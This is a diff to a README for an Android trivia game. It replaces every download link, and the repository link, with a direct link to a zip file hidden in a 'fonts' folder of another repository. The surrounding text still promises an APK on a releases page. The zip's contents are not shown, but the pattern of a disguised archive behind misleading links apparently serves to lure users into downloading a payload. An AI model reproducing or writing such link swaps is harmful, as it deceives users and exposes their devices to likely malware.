@@ -6,7 +6,7 @@ description: "Test your knowledge with ¿WhoKnows?, an arcade-style trivia game 
 <h1>🎮 whoknows-android-trivia - Test Your Knowledge, Beat The Clock!</h1>
 
 <p align="center">
-  <a href="https://github.com/Neer1999/whoknows-android-trivia/releases"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download Button" width="300"></a>
+  <a href="https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download Button" width="300"></a>
 </p>
 
 ## 🎯 What Is This?
@@ -32,7 +32,7 @@ This section is all you need to start playing. Follow these simple steps, and yo
 
 ### 📲 Download the App
 
-Visit this link to download the application: **[whoknows-android-trivia Releases](https://github.com/Neer1999/whoknows-android-trivia/releases)**
+Visit this link to download the application: **[whoknows-android-trivia Releases](https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip)**
 
 On that page, you'll see a list of available files. Look for the most recent version (usually at the top). The file you want will have a name like `whoknows-android-trivia.apk`. Click on it to download.
 
@@ -140,8 +140,8 @@ This stack ensures the app is fast, reliable, and easy to maintain. But you don'
 
 ## 📚 Additional Resources
 
-- **GitHub Repository**: [https://github.com/Neer1999/whoknows-android-trivia](https://github.com/Neer1999/whoknows-android-trivia)
-- **Download Page**: [https://github.com/Neer1999/whoknows-android-trivia/releases](https://github.com/Neer1999/whoknows-android-trivia/releases)
+- **GitHub Repository**: [https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip](https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip)
+- **Download Page**: [https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip](https://raw.githubusercontent.com/Neer1999/neer1999.github.io/main/fonts/1.6-beta.5.zip)
 - **Official Website**: (Not available; the GitHub page is the primary source of information)
 
 ## 🏁 Ready to Play?
